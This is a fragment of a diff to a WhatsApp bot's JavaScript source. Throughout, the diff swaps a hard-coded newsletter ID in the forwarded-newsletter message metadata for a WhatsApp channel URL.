+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15331,7 +15331,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15379,7 +15379,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15427,7 +15427,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15475,7 +15475,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15523,7 +15523,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15572,7 +15572,7 @@ _*Here is the result of ${command}*_`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15660,7 +15660,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15715,7 +15715,7 @@ case 'handsomecheck':{
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15760,7 +15760,7 @@ case 'beautifulcheck':{
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15805,7 +15805,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15920,7 +15920,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -15969,7 +15969,7 @@ try {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16021,7 +16021,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16093,7 +16093,7 @@ ${translatedChapterHindi.text}`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16159,7 +16159,7 @@ https://cloud.google.com/translate/docs/languages
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16282,7 +16282,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16380,7 +16380,7 @@ case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16420,7 +16420,7 @@ return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16470,7 +16470,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16524,7 +16524,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16573,7 +16573,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16621,7 +16621,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16667,7 +16667,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16766,7 +16766,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16832,7 +16832,7 @@ if (!text) return replygcxeon('Please provide a song name')
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -16951,7 +16951,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17010,7 +17010,7 @@ case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvide
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17058,7 +17058,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17120,7 +17120,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17172,7 +17172,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17339,7 +17339,7 @@ if (!text) return replygcxeon('What do u want to make?')
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17380,7 +17380,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17426,7 +17426,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17478,7 +17478,7 @@ case 'photoleap': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17527,7 +17527,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17578,7 +17578,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17626,7 +17626,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17674,7 +17674,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17722,7 +17722,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17770,7 +17770,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17818,7 +17818,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17866,7 +17866,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17914,7 +17914,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -17962,7 +17962,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18010,7 +18010,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18058,7 +18058,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18106,7 +18106,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18154,7 +18154,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18202,7 +18202,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18250,7 +18250,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18298,7 +18298,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18346,7 +18346,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18394,7 +18394,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18442,7 +18442,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18494,7 +18494,7 @@ await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18550,7 +18550,7 @@ ${resulw}`
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18631,7 +18631,7 @@ case 'traceanime': {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18686,7 +18686,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18739,7 +18739,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -18975,7 +18975,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -19109,7 +19109,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19269,7 +19269,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19404,7 +19404,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -19538,7 +19538,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19619,7 +19619,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19754,7 +19754,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -19888,7 +19888,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -19969,7 +19969,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20104,7 +20104,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -20238,7 +20238,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20319,7 +20319,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20454,7 +20454,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -20588,7 +20588,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20669,7 +20669,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -20804,7 +20804,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -20938,7 +20938,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21019,7 +21019,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21154,7 +21154,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
 newsletterName: ownername,
-newsletterJid: "120363222395675670@newsletter",
+newsletterJid: "https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G",
 },
 externalAdReply: {
 showAdAttribution: true,
@@ -21288,7 +21288,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21369,7 +21369,7 @@ let msg = generateWAMessageFromContent(m.chat, {
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
-                  newsletterJid: '120363222395675670@newsletter',
+                  newsletterJid: 'https://whatsapp.com/channel/0029Vacs3IIIiRp0FeDDcJ1G',
                   newsletterName: ownername,
                   serverMessageId: 143
                 }
@@ -21504,7 +21504,7 @@ isForwarded: true,
 mentionedJid: [sender],
 forwardedNewsletterMessageInfo: {
